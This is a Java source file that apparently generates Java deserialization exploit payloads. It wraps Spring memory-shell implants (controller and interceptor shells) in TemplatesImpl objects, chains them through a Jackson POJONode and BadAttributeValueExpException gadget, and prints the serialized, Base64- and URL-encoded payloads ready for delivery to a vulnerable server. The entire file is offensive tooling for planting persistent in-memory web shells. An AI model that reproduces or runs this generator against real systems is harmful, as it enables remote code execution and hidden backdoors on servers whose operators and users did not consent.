package unknown.memshell;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import unknown.Gadget;
import unknown.Util;
import unknown.agent.AgentLoader;
import unknown.memshell.spring.SpringShellGen;

import javax.management.BadAttributeValueExpException;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws Exception{

        TemplatesImpl controllerShell = SpringShellGen.controllerShell();
        TemplatesImpl controllerShellHigher = SpringShellGen.controllerShellHigher();
        TemplatesImpl interceptorShell = SpringShellGen.interceptorShell();
        new AgentLoader("unknown.memshell.Main").loadPOJONodeAgent("E:\\ideaProjects\\main_unknown\\src\\main\\resources\\Agent-POJONode.jar");

        BadAttributeValueExpException bd1 = Gadget.getBadAttributeValueExpException(new POJONode(controllerShell));
        BadAttributeValueExpException bd2 = Gadget.getBadAttributeValueExpException(new POJONode(controllerShellHigher));
        BadAttributeValueExpException bd3 = Gadget.getBadAttributeValueExpException(new POJONode(interceptorShell));

        System.out.println(Util.URLEncode(Base64.getEncoder().encodeToString(Util.serialize(bd1))));
        System.out.println(Util.URLEncode(Base64.getEncoder().encodeToString(Util.serialize(bd2))));
        System.out.println(Util.URLEncode(Base64.getEncoder().encodeToString(Util.serialize(bd3))));


    }
}
